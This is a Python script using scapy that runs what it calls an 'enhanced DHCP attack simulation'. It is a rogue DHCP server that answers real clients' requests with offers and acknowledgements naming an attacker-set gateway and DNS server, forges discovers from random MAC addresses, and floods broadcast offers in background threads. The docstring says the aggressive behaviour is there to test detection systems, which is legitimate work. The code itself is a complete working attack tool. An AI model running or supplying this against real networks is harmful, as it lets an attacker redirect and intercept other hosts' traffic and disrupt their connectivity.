#!/usr/bin/env python3
"""
Enhanced DHCP Attack Simulation Script

This script creates a more aggressive rogue DHCP server that's easier to detect.
It will continuously send DHCP offers and broadcasts its presence.
"""

import sys
import time
import random
import socket
import threading
import argparse
from typing import Dict, Tuple, List
import os

try:
    from scapy.all import (
        Ether, IP, UDP, BOOTP, DHCP, sendp, conf, get_if_hwaddr,
        get_if_addr, sniff, RandMAC
    )
except ImportError:
    sys.exit("This script requires scapy. Install it using: pip install scapy")

class EnhancedDHCPAttackSimulator:
    """-More aggressive DHCP attack simulation for testing detection systems-"""
    
    def __init__(self, interface: str = None, offered_ip: str = None, rogue_ip: str = None,
                 gateway_ip: str = None, subnet_mask: str = None, 
                 dns_server: str = None, lease_time: int = 86400):
        """Initialize the DHCP attack simulator"""
        self.interface = interface or conf.iface
        
        # Get our own MAC and IP
        self.mac = get_if_hwaddr(self.interface)
        self.ip = get_if_addr(self.interface)
        
        # DHCP configuration
        self.offered_ip = offered_ip or "192.168.100.100"
        self.gateway_ip = gateway_ip or self.ip
        self.subnet_mask = subnet_mask or "255.255.255.0"
        self.dns_server = dns_server or "8.8.8.8"
        self.lease_time = lease_time
        self.rogue_ip = rogue_ip or "192.168.100.89"
        
        # Keep track of allocated IPs and client tracking
        self.allocated_ips = {}
        self.clients_seen = set()
        
        # Flag to control the infinite loops
        self.running = True
        
        print(f"[*] Enhanced DHCP Attack Simulator initialized")
        print(f"[*] Interface: {self.interface}")
        print(f"[*] Attacker MAC: {self.mac}")
        print(f"[*] Attacker IP: {self.rogue_ip}")
        print(f"[*] Offering IPs starting from: {self.offered_ip}")
        print(f"[*] Gateway IP: {self.gateway_ip}")
    
    def get_next_ip(self, client_mac: str) -> str:
        """Get the next available IP to offer"""
        if client_mac in self.allocated_ips:
            return self.allocated_ips[client_mac]
        
        # Parse the base IP and increment the last octet
        base_parts = self.offered_ip.split('.')
        base_parts[3] = str(int(base_parts[3]) + len(self.allocated_ips) % 150)
        next_ip = '.'.join(base_parts)
        
        # Store the allocation
        self.allocated_ips[client_mac] = next_ip
        return next_ip
    
    def create_dhcp_offer(self, client_mac, xid=None):
        """Create a DHCP offer packet"""
        if xid is None:
            xid = random.randint(1, 0xFFFFFFFF)
            
        # Get IP to offer
        offered_ip = self.get_next_ip(client_mac)
        
        # Create the DHCP offer packet
        ether = Ether(src=self.mac, dst=client_mac)
        ip = IP(src=self.rogue_ip, dst="255.255.255.255")
        udp = UDP(sport=67, dport=68)
        bootp = BOOTP(
            op=2,  # BOOTREPLY
            xid=xid,
            yiaddr=offered_ip,
            siaddr=self.rogue_ip,
            chaddr=bytes.fromhex(client_mac.replace(':', '')).ljust(16, b'\0'),
            sname=b'roguedhcp',
            file=b'',
        )
        
        # DHCP options
        dhcp_options = [
            ("message-type", "offer"),
            ("server_id", self.rogue_ip),
            ("lease_time", self.lease_time),
            ("subnet_mask", self.subnet_mask),
            ("router", self.gateway_ip),
            ("name_server", self.dns_server),
            "end"
        ]
        
        dhcp = DHCP(options=dhcp_options)
        
        # Combine all layers
        offer_packet = ether / ip / udp / bootp / dhcp
        return offer_packet
    
    def create_dhcp_ack(self, client_mac, requested_ip=None, xid=None):
        """Create a DHCP ACK packet"""
        if xid is None:
            xid = random.randint(1, 0xFFFFFFFF)
            
        if not requested_ip:
            requested_ip = self.get_next_ip(client_mac)
        
        # Create the DHCP ACK packet
        ether = Ether(src=self.mac, dst=client_mac)
        ip = IP(src=self.rogue_ip, dst="255.255.255.255")
        udp = UDP(sport=67, dport=68)
        bootp = BOOTP(
            op=2,  # BOOTREPLY
            xid=xid,
            yiaddr=requested_ip,
            siaddr=self.rogue_ip,
            chaddr=bytes.fromhex(client_mac.replace(':', '')).ljust(16, b'\0'),
            sname=b'roguedhcp',
            file=b'',
        )
        
        # DHCP options
        dhcp_options = [
            ("message-type", "ack"),
            ("server_id", self.rogue_ip),
            ("lease_time", self.lease_time),
            ("subnet_mask", self.subnet_mask),
            ("router", self.gateway_ip),
            ("name_server", self.dns_server),
            "end"
        ]
        
        dhcp = DHCP(options=dhcp_options)
        
        # Combine all layers
        ack_packet = ether / ip / udp / bootp / dhcp
        return ack_packet
    
    def send_dhcp_discover(self):
        """Send a DHCP discover packet"""
        # Create a random MAC address for the client
        client_mac = str(RandMAC())
        client_xid = random.randint(1, 0xFFFFFFFF)
        
        # Create the discovery packet
        ether = Ether(src=client_mac, dst="ff:ff:ff:ff:ff:ff")
        ip = IP(src="0.0.0.0", dst="255.255.255.255")
        udp = UDP(sport=68, dport=67)
        bootp = BOOTP(
            op=1,  # BOOTREQUEST
            xid=client_xid,
            chaddr=bytes.fromhex(client_mac.replace(':', '')).ljust(16, b'\0'),
        )
        dhcp = DHCP(options=[("message-type", "discover"), "end"])
        
        # Combine all layers
        discover_packet = ether / ip / udp / bootp / dhcp
        
        # Send the packet
        sendp(discover_packet, iface=self.interface, verbose=0)
        print(f"[+] Sent DHCP discover from client MAC: {client_mac}")
        
        # Immediately send a corresponding offer to make sure it's visible
        time.sleep(0.1)
        offer_packet = self.create_dhcp_offer(client_mac, client_xid)
        sendp(offer_packet, iface=self.interface, verbose=0)
        print(f"[+] Sent unsolicited DHCP offer to {client_mac} offering {self.allocated_ips.get(client_mac)}")
        
        return client_mac, client_xid
    
    def handle_dhcp_packet(self, packet):
        """Handle incoming DHCP packets"""
        # Check if this is a DHCP packet
        if not (DHCP in packet):
            return
        
        # Get DHCP message type
        msg_type = None
        for option in packet[DHCP].options:
            if isinstance(option, tuple) and option[0] == 'message-type':
                msg_type = option[1]
                break
        
        if msg_type == 1:  # DHCP Discover
            print(f"[+] Received DHCP DISCOVER from {packet[Ether].src}")
            self.clients_seen.add(packet[Ether].src)
            offer = self.create_dhcp_offer(packet[Ether].src, packet[BOOTP].xid)
            time.sleep(0.1)  # Small delay to ensure the offer is seen
            sendp(offer, iface=self.interface, verbose=0)
            print(f"[+] Sent DHCP OFFER to {packet[Ether].src} offering {self.allocated_ips.get(packet[Ether].src)}")
            
        elif msg_type == 3:  # DHCP Request
            print(f"[+] Received DHCP REQUEST from {packet[Ether].src}")
            self.clients_seen.add(packet[Ether].src)
            ack = self.create_dhcp_ack(packet[Ether].src, None, packet[BOOTP].xid)
            sendp(ack, iface=self.interface, verbose=0)
            print(f"[+] Sent DHCP ACK to {packet[Ether].src} confirming {self.allocated_ips.get(packet[Ether].src)}")
    
    def broadcast_presence(self):
        """Continuously broadcast DHCP offers to make the rogue server more visible"""
        while self.running:
            try:
                # Send a fake discover and respond to it
                client_mac, client_xid = self.send_dhcp_discover()
                
                # Also send to broadcast MAC to be extra visible
                broadcast_mac = "ff:ff:ff:ff:ff:ff"
                offer_packet = self.create_dhcp_offer(broadcast_mac)
                sendp(offer_packet, iface=self.interface, verbose=0)
                
                # Sleep before next broadcast
                time.sleep(2)
            except Exception as e:
                print(f"[!] Error in broadcast thread: {e}")
                time.sleep(1)
    
    def aggressive_mode(self):
        """Send offers to all clients we've seen"""
        while self.running:
            try:
                for client_mac in list(self.clients_seen):
                    # Send offers to all clients we've seen
                    offer = self.create_dhcp_offer(client_mac)
                    sendp(offer, iface=self.interface, verbose=0)
                    print(f"[+] Sent aggressive DHCP offer to {client_mac}")
                
                # Sleep before next aggressive cycle
                time.sleep(5)
            except Exception as e:
                print(f"[!] Error in aggressive thread: {e}")
                time.sleep(1)
    
    def run(self, duration: int = None, aggressive: bool = True):
        """
        Run the enhanced DHCP attack simulation
        
        Args:
            duration: How long to run the attack for (seconds); None means indefinitely
            aggressive: If True, use multiple techniques to be more visible
        """
        print("\n[*] Starting enhanced DHCP attack simulation...")
        
        # Start the broadcast thread if in aggressive mode
        if aggressive:
            broadcast_thread = threading.Thread(target=self.broadcast_presence)
            broadcast_thread.daemon = True
            broadcast_thread.start()
            
            aggressive_thread = threading.Thread(target=self.aggressive_mode)
            aggressive_thread.daemon = True
            aggressive_thread.start()
        
        # Send an initial discover to trigger detection systems
        self.send_dhcp_discover()
        
        print("[*] Waiting for DHCP traffic...")
        
        try:
            # Set end time if duration specified
            end_time = time.time() + duration if duration else None
            
            while True:
                # Check if we should exit due to duration
                if end_time and time.time() > end_time:
                    break
                
                # Sniff for short periods to allow checking duration
                sniff(
                    filter="udp and (port 67 or port 68)",
                    prn=self.handle_dhcp_packet,
                    iface=self.interface,
                    timeout=1,
                    store=0
                )
                
                # Send another discover periodically to maintain visibility
                if random.random() < 0.2:  # 20% chance each second
                    self.send_dhcp_discover()
                
        except KeyboardInterrupt:
            print("\n[*] Attack simulation stopped by user")
        finally:
            self.running = False
            # Give threads time to clean up
            time.sleep(1)
        
        print("[*] Enhanced DHCP attack simulation completed")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Enhanced DHCP Attack Simulation Tool")
    parser.add_argument("-i", "--interface", help="Network interface to use")
    parser.add_argument("-p", "--ip", help="Base IP address to offer to clients")
    parser.add_argument("-rp", "--rogue-ip", help="IP address to use for the rogue server")
    parser.add_argument("-g", "--gateway", help="Gateway IP to offer to clients")
    parser.add_argument("-d", "--dns", help="DNS server to offer to clients")
    parser.add_argument("-t", "--time", type=int, default=60, 
                        help="How long to run the attack (seconds, default: 60)")
    parser.add_argument("--normal", action="store_true", 
                        help="Use normal mode instead of aggressive mode")
    
    args = parser.parse_args()
    
    # Create the simulator
    simulator = EnhancedDHCPAttackSimulator(
        interface=args.interface,
        offered_ip=args.ip,
        rogue_ip=args.rogue_ip,
        gateway_ip=args.gateway,
        dns_server=args.dns
    )
    
    # Run the simulation
    simulator.run(duration=args.time, aggressive=not args.normal)